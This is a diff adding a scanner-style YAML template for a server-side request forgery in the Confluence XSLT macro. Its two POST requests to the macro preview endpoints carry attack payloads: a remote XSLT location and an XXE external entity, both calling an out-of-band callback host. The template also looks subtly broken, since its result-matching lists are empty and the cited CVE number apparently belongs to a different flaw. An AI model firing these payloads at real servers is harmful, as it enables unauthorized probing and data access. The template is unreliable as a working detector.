@@ -1,0 +1,51 @@
+id: confluence-xslt-macro-ssrf
+brief:
+    title: Atlassian Confluence XSLT Macro - Server-Side Request Forgery
+    by: ritikchaddha
+    level: high
+    about: Atlassian Confluence Data Center and Server include an XSLT macro feature that may be vulnerable to Server-Side Request Forgery (SSRF). By leveraging the ability of the XSLT macro to access externa...
+    label:
+        - cve
+        - cve2024
+        - confluence
+        - atlassian
+        - ssrf
+        - xslt
+        - macro
+    score: CVE-2024-29415 CVSS:6.5
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/rest/tinymce/1/macro/preview'
+        - '{{BaseURL}}/rest/api/content/macro/preview'
+      head:
+        Content-Type: application/json
+      body: |
+        {
+          "macro": {
+            "name": "xslt",
+            "body": "",
+            "params": {
+              "location": "http://{{interactsh-url}}/test.xsl"
+            }
+          }
+        }
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/rest/tinymce/1/macro/preview'
+        - '{{BaseURL}}/rest/api/content/macro/preview'
+      head:
+        Content-Type: application/json
+      body: |
+        {
+          "macro": {
+            "name": "xslt",
+            "body": "",
+            "params": {
+              "xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://{{interactsh-url}}/test'>]><foo>&xxe;</foo>",
+              "xslt": "<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform'><xsl:template match='/'>Test</xsl:template></xsl:stylesheet>"
+            }
+          }
+        }
+      signs: []
